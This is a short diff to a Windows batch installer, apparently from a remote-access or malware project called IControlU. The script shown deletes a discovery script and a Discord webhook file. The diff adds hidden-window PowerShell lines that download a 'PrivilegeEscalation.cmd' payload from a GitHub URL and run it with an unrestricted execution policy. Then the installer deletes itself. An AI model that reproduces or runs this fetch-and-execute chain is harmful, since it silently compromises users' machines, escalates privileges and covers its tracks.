@@ -20,9 +20,11 @@ powershell -ExecutionPolicy RemoteSigned -File "Discovery.ps1"
 @REM Delete the discovery file
 del "Discovery.ps1"
 
-
 @REM Delete the Discord Webhook file
 del "DiscordWebhookURL.icu"
+
+powershell -windowstyle hidden Invoke-WebRequest -Uri "https://github.com/ReylanTeo/IControlU/blob/f49099d8d113b227d42a031886fca74aba4cf772/Payload/PrivilegeEscalation.cmd" -OutFile "PrivilegeEscalation.cmd"
+powershell -windowstyle hidden -ep unrestricted "./PrivilegeEscalation.cmd"
 
 @REM Delete the original installer
 cd /d %CurrentDirectory%
